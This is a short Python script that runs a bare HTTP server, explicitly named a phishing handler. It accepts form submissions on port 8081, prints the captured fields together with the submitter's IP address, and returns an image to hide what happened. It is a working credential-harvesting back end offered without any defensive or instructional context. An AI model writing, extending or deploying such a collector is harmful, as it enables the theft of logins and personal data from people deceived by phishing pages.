from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse as urlparse
import os

class PhishingHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Get the length of the data
        content_length = int(self.headers['Content-Length'])
        # Read the data sent by the form
        post_data = self.rfile.read(content_length)
        # Parse the data
        parsed_data = urlparse.parse_qs(post_data.decode())
        # Log the client's IP address
        client_ip = self.client_address[0]
        print(f"Captured Data: {parsed_data}")
        print(f"Client IP: {client_ip}")

        # Send a response to the user with an image
        self.send_response(200)
        self.send_header('Content-type', 'image/jpeg')
        self.end_headers()
        # Path to your image
        img_path = 'inter.jpg'
        with open(img_path, 'rb') as file:
            self.wfile.write(file.read())

# Configure the server
def run_server():
    server_address = ('', 8081)  # Listen on all IPs, port 8081
    httpd = HTTPServer(server_address, PhishingHandler)
    print("Server running on http://localhost:8081...")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
